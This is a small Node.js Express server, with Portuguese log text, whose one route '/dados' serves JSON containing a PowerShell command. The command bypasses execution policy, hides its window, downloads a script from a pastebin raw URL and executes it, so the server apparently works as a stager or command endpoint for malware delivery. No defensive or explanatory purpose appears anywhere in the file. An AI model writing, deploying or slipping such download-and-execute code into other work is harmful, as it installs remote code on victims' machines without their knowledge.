const express = require('express');
const app = express();

app.get('/dados', (req, res) => {
    const data = {
      dp: true,
      link: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command [scriptblock]::Create((Invoke-WebRequest "https://pastebin.com/raw/jW0p6fGc" -UseBasicParsing)).Invoke();"'
    };
  
    const json = JSON.stringify(data, null, 2).replace(/\\/g, '');
    res.setHeader('Content-Type', 'application/json');
    res.send(json);
  });
  
  

const port = 80;
app.listen(port, () => {
  console.log(`Servidor ouvindo na porta ${port}`);
});
